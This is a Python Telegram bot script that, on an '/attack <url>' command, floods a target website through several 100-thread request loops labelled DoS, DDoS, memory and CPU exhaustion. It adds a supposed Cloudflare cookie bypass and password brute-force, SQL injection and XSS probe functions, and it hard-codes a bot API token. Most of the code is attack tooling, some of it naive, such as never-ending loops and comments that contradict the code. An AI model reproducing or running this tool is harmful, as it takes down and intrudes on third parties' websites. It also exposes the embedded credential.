import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import telebot

# Your Telegram bot token
API_TOKEN = '7697987348:AAEeDSCOM_jGyXG_vKBRdLidZhEBPl5zIbQ'

# Bot setup
bot = telebot.TeleBot(API_TOKEN)
protection_active = False

# Constants
lock = threading.Lock()

def disable_website(url):
    # Get the Cloudflare bypass token
    bypass_token = get_cloudflare_bypass_token(url)

    # Disable the website by setting the bypass token
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36',
        'Cookie': f'__cf_bm={bypass_token}'
    }
    requests.get(url, headers=headers)

def get_cloudflare_bypass_token(url):
    # Send a request to the Cloudflare challenge page to get the bypass token
    response = requests.get(url, allow_redirects=False)

    # Get the bypass token from the response headers
    bypass_token = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

    return bypass_token

def flood(url):
    def task():
        send_request(url)

    with ThreadPoolExecutor(max_workers=100) as executor:
        while protection_active:
            executor.submit(task)

def dos(url):
    def task():
        try:
            response = requests.get(url, stream=True)  # Disable SSL verification and stream response
            for chunk in response.iter_content(chunk_size=1024):
                pass  # Do nothing with the response data
        except requests.RequestException:
            pass

    with ThreadPoolExecutor(max_workers=100) as executor:
        while protection_active:
            executor.submit(task)

def ddos(url):
    def task():
        try:
            response = requests.get(url, stream=True)  # Disable SSL verification and stream response
            for chunk in response.iter_content(chunk_size=1024):
                pass  # Do nothing with the response data
        except requests.RequestException:
            pass

    with ThreadPoolExecutor(max_workers=100) as executor:
        while protection_active:
            for i in range(10):  # Send 10 requests from each thread
                executor.submit(task)

def memory_exhaustion(url):
    def task():
        try:
            response = requests.get(url, stream=True)  # Disable SSL verification and stream response
            while True:
                response.raw.read(1024)  # Read 1KB of data from the response
        except requests.RequestException:
            pass

    with ThreadPoolExecutor(max_workers=100) as executor:
        while protection_active:
            executor.submit(task)

def cpu_exhaustion(url):
    def task():
        while protection_active:
            requests.get(url)  # Send a GET request to the URL

    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.submit(task)

def brute_force(url, username, password_list):
    def task():
        for password in password_list:
            try:
                response = requests.post(url, data={'username': username, 'password': password})
                if response.status_code == 200:
                    print(f"Password found: {password}")
                    return password
            except requests.RequestException:
                pass

    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.submit(task)

def sql_injection(url, payload):
    def task():
        try:
            response = requests.get(url + payload)
            if response.status_code == 200:
                print("SQL injection successful.")
        except requests.RequestException:
            pass

    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.submit(task)

def xss(url, payload):
    def task():
        try:
            response = requests.get(url + payload)
            if response.status_code == 200:
                print("XSS successful.")
        except requests.RequestException:
            pass

    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.submit(task)

def send_request(url):
    try:
        response = requests.get(url, timeout=5)  # Enable SSL verification by default
    except requests.RequestException:
        pass

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global protection_active

    try:
        url = message.text.split()[1]
    except IndexError:
        bot.send_message(message.chat.id, "Usage: /attack <url>")
        return

    protection_active = True
    bot.send_message(message.chat.id, f"Starting to attack {url}...")
    flood(url)
    dos(url)
    ddos(url)
    memory_exhaustion(url)
    cpu_exhaustion(url)
    disable_website(url)
    bot.send_message(message.chat.id, "Attack finished.")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    global protection_active
    protection_active = False
    bot.send_message(message.chat.id, "Stopping attack...")

@bot.message_handler(commands=['start', 'help'])
def handle_start_help(message):
    bot.send_message(message.chat.id, "Commands:\n/attack <url>\n/stop")

bot.polling()
